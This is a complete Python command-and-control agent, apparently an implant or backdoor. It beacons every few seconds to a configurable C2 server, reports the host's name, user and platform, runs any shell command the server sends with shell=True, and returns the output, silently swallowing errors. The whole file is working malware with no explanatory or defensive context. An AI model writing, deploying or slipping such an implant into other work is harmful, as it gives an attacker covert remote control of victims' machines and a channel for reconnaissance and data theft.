#!/usr/bin/env python3
import os, sys, json, time, subprocess, platform, socket, uuid
try:
    import urllib.request as urlreq
except Exception:
    import urllib2 as urlreq

SERVER = os.environ.get('C2_SERVER', 'http://127.0.0.1:8080')
AGENT_ID = os.environ.get('AGENT_ID') or str(uuid.uuid4())

def sysinfo():
    uname = platform.uname()
    try:
        user = os.getlogin()
    except Exception:
        user = os.environ.get('USER') or 'unknown'
    return {
        'hostname': socket.gethostname(),
        'username': user,
        'platform': sys.platform,
        'release': getattr(uname, 'release', ''),
    }

def http_post(path, payload):
    data = json.dumps(payload).encode('utf-8')
    req = urlreq.Request(SERVER + path, data=data, headers={'Content-Type':'application/json'})
    with urlreq.urlopen(req, timeout=15) as resp:
        return json.loads(resp.read().decode('utf-8'))

while True:
    try:
        resp = http_post('/api/checkin', {'agent_id': AGENT_ID, 'info': sysinfo()})
        task = resp.get('task')
        if task and task.get('type') == 'cmd':
            cmd = task.get('cmd')
            try:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                out, err = p.communicate(timeout=60)
                code = p.returncode
            except Exception as e:
                out, err, code = '', str(e), 1
            http_post('/api/result', {'agent_id': AGENT_ID, 'task_id': task.get('id'), 'stdout': out, 'stderr': err, 'code': code})
    except Exception:
        pass
    time.sleep(3)
